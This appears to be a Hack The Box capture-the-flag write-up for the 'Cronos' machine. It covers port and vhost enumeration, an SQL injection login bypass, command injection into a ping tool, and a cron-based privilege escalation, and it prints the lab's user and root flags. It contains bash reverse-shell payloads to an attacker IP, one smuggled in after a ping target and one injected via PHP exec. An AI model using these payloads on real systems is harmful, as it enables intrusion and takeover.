@@ -1,0 +1,94 @@
+<div class="writeup-content">
+    <div style="text-align: center;">
+        <h1>Hack The Box</h1>
+        <h2>Cronos</h2>
+        <img src="/pngs/HTB/Medium/Cronos/Cronos.png" alt="Cronos Banner" style="border:none; width: 300px; margin-bottom: 20px;">
+        <h3 style="color: #3fb950;">Level: Medium</h3>
+    </div>
+
+    <h3 class="step-header">1. Enumeration</h3>
+    <p>I started with port enumeration:</p>
+    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 1000 -Pn -n -vvv 10.10.10.13</div>
+    
+    <ul>
+        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+        <li><strong>-sS</strong>: SYN stealth scan.</li>
+        <li><strong>-Pn</strong>: Disable ICMP Echo request.</li>
+        <li><strong>--min-rate</strong>: How many packets should be sent simultaneously.</li>
+        <li><strong>-n</strong>: disables DNS resolution.</li>
+        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+    </ul>
+
+    <p>Ports 22 (SSH), 53(DNS) and 80 (HTTP) are open. Service scan:</p>
+    <div class="terminal-box">nmap -sC -sV -p22,53,80  10.10.10.13</div>
+        
+    <ul>
+        <li><strong>-sC</strong>: Runs default scripts.</li>
+        <li><strong>-sV</strong>: Enumerates for the version running.</li>
+    </ul>
+
+    <p>The domain is <code>cronos.htb</code>. I updated my <code>/etc/hosts</code>:</p>
+
+    <div class="terminal-box">echo "10.10.10.13 cronos.htb" | sudo tee -a /etc/hosts</div>
+        
+    <p>Next step is vhost enumeration:</p>
+
+    <div class="terminal-box">ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://cronos.htb/ -H 'Host: FUZZ.cronos.htb' -fs 11439</div>
+
+      <ul>
+        <li><strong>-w ~/path/to/subdomain.txt</strong>: This is the wordlist that is used to start the fuzzing.</li>
+        <li><strong>-fs</strong>: Exclude responses with a specific file size.</li>
+    </ul>
+    
+    <p>We can get the same results by abusing the DNS port.</p>
+
+    <div class="terminal-box">dig axfr @10.10.10.13 cronos.htb</div>
+
+    <p>Found a subdomain named <code>admin</code> it requires authentication.</p>
+
+    <h3 class="step-header">2. Command Injection</h3>
+
+    <p>I tried default credentials, but in the end I passed the login page with SQLi injection.</p>
+    <div class="terminal-box">admin' -- </div>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161409.png">
+
+    <p>I logged in and I can see the headers : <code>Net Tool v0.1</code></p>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161454.png">
+    <p>It looks like a ping command, since there is a "traceroute" and an "execute" button.</p>
+    <p>Before I continue I open a listener to my machine.</p>
+    <div class="terminal-box">nc -lvnp 4445</div>
+    <p>Then tried to do a Command Injection to get a reverse shell:</p>
+    <div class="terminal-box">8.8.8.8; bash -c 'sh -i >& /dev/tcp/10.10.14.17/4445 0>&1'</div>
+    <p>Back to my listener, I have a shell as <code>www-data</code>.</p>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161850.png">
+
+    <p>Now I am ready to read the user flag.</p>
+
+    
+    <fieldset class="root-box">
+        <legend>User Flag</legend>
+        <code>da612bb76ce8f8a0a10d0775b4f36de1</code>
+    </fieldset>
+</div>
+    
+    <h3 class="step-header">3. Privilege Escalation</h3>
+    <p>By visiting the <code>/etc</code> someone can find the <code>crontab</code> file.</p>
+    <p>There is an interesting cron job.</p>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162031.png">
+
+    <ul>
+        <li><strong>* * * * * root...</strong>runs every minute as root.</li>
+    </ul>
+    <p>I can see that I have write permissions over this file.</p>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162306.png">
+    <p>I copied the content of the file and I added a small command in the top of it to get a reverse shell as root.</p>
+    <div class="terminal-box">exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.17/4446 0>&1'");</div>
+    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162422.png">
+    <p>I set my listener and after about a minute I got the root shell.</p>
+    <div class="terminal-box">nc -lvnp 4446</div>
+
+    <fieldset class="root-box">
+        <legend>Root Flag</legend>
+        <code>78fb9e40fb3fe525fc848d7d8275229e</code>
+    </fieldset>
+</div>
